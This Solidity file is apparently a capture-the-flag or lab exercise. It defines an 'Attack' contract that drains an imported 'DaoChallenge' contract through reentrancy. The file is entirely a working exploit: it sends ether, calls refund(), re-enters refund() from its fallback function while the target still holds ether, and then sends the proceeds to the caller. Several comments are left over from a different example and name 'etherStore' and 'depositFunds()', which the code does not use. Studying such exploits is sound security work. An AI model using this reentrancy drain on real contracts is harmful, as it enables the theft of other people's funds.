pragma solidity ^0.4.25;

import "./DaoChallenge.sol";

contract Attack {
  DaoChallenge public daoChallenge;

  // intialise the etherStore variable with the contracts address
  constructor(address _DaoChallengeAddress) {
      daoChallenge = DaoChallenge(_DaoChallengeAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      daoChallenge.call.value(2 ether)();
      // start the magic
      daoChallenge.refund();
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (daoChallenge.balance > 1 ether) {
          daoChallenge.refund();
      }
  }
}